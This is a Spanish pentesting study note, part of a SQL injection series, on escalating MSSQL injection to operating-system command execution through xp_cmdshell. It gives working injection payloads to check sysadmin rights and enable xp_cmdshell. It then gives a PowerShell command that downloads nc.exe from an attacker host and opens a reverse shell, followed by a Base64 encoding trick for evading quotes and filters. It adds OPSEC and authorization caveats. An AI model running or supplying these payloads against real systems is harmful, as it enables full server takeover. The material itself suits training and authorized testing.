---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[09 - Exfiltración Out-of-Band por DNS]]"
Nota siguiente: "[[11 - MSSQL robo de hashes NetNTLM]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Si la inyección se ejecuta como el usuario `sa` (o cualquier cuenta con rol `sysadmin`), MSSQL permite ejecutar **comandos arbitrarios** del sistema operativo vía `xp_cmdshell`. Esto convierte la SQLi en un compromiso total del servidor —el equivalente MSSQL de la [[08 - Escritura de archivos|web shell]] en MySQL, pero más directo—. Es posible porque <mark style="background: #FFB8EBA6;">MSSQL soporta consultas apiladas (`;`)</mark>, así que tras la query vulnerable encadenamos las nuestras.

# Paso 1: verificar privilegios

`xp_cmdshell` exige rol `sysadmin`. Se comprueba con `IS_SRVROLEMEMBER`:

```sql
maria' AND IS_SRVROLEMEMBER('sysadmin')=1-- -
```

Si la respuesta del [[03 - Diseño del oráculo booleano|oráculo]] es verdadera (`taken`), somos `sysadmin`.

# Paso 2: habilitar `xp_cmdshell`

Por ser un objetivo obvio de ataque, <mark style="background: #ADCCFFA6;">`xp_cmdshell` viene deshabilitado por defecto</mark>, pero un `sysadmin` lo reactiva en dos pasos (primero las opciones avanzadas, luego el procedimiento):

```sql
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;--
';EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

# Paso 3: confirmar la ejecución

Antes de lanzar una shell, se valida con un `ping` hacia nuestra máquina, capturando los ICMP con `tcpdump`:

```sql
';EXEC xp_cmdshell 'ping /n 4 10.10.15.2';--
```

```shell-session
$ sudo tcpdump -i tun0 icmp
... IP target > 10.10.15.2: ICMP echo request ...
```

<mark style="background: #FFB86CA6;">Recibir los 4 pings confirma ejecución de comandos</mark> sin necesidad de salida en la respuesta web —de nuevo, trabajamos a ciegas—. Por defecto los comandos corren como `nt service\mssqlserver`.

# Paso 4: reverse shell

El patrón clásico: descargar `nc.exe` desde nuestra máquina y conectar de vuelta. El comando PowerShell:

```powershell
(new-object net.webclient).downloadfile("http://10.10.15.2/nc.exe","c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv 10.10.15.2 9999 -e c:\windows\system32\cmd.exe;
```

Para evitar problemas con las comillas anidadas, se codifica el comando en **UTF-16LE + Base64** y se pasa con `-enc`:

```shell-session
$ python3 -c 'import base64; print(base64.b64encode(("""PAYLOAD""").encode("utf-16-le")).decode())'
```

```sql
';EXEC xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdwA...';--
```

Con un `python3 -m http.server 80` sirviendo `nc.exe` y un `nc -nvlp 9999` escuchando, la inyección devuelve una shell:

```shell-session
$ nc -nvlp 9999
Microsoft Windows [Version 10.0.19043.1826]
C:\Windows\system32>
```

> [!info]+
> El one-liner de codificación (UTF-16LE → Base64 → `-enc`) es **reutilizable** para cualquier payload PowerShell, no solo aquí: evade comillas y filtros básicos. Es la misma técnica que [[SQLMap.base|SQLMap]] automatiza con `--os-shell` contra MSSQL. Y si ya tienes credenciales, `impacket-mssqlclient` ofrece [[00 - Introducción a MSSQL|`enable_xp_cmdshell`]] directamente.

> [!warning]+
> **OPSEC**: <mark style="background: #FF5582A6;">`sqlservr.exe` lanzando `cmd.exe`/`powershell.exe` es una de las firmas que todo EDR moderno detecta</mark>. Reactivar `xp_cmdshell` y soltar un `nc.exe` es ruidosísimo. En un engagement con Blue Team activo, considera vías más sigilosas y limpia tras de ti (`sp_configure 'xp_cmdshell','0'`). En bug bounty, demuestra el RCE con un comando inocuo (`whoami`, una petición OOB) y no establezcas shell salvo autorización.

> [!info]+
> `xp_cmdshell` no es la única vía de RCE en MSSQL. Si está bloqueado, existen alternativas: **OLE Automation** (`sp_OACreate`), **CLR assemblies** (cargar un ensamblado .NET malicioso), o crear **trabajos del SQL Server Agent**. Conocerlas amplía las opciones cuando la vía obvia está cerrada.

Más allá de la ejecución directa, MSSQL puede usarse para **robar credenciales de red** forzando autenticaciones salientes: [[11 - MSSQL robo de hashes NetNTLM]].
